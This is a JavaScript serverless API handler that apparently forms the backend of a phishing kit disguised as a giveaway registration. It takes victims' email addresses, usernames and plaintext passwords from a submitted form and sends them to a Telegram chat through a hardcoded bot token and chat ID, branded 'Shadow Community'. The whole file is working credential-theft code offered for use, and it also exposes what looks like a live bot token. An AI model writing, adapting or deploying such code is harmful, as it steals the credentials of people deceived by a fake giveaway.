export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password, username, option } = req.body;

    // ===== REPLACE WITH YOUR TELEGRAM BOT CREDENTIALS =====
    const BOT_TOKEN = "8795128896:AAEc1-iJ0f0FF6x4CH0ihEUbA1i7NbYTuHw";
    const CHAT_ID = "8381916527";

    const message = `
🎯 *NEW GIVEAWAY REGISTRATION!*

👤 *Name:* ${username || 'Guest'}
📧 *Email:* ${email}
🔒 *Password:* ${password}
🎁 *Option:* ${option}
📅 *Date:* ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━
🖤 *Shadow Community*
🔥 *GpsirEra*
~#gpsirAI
`;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        const result = await response.json();
        res.status(200).json({ success: result.ok });
    } catch (error) {
        res.status(200).json({ success: false, error: error.message });
    }
}
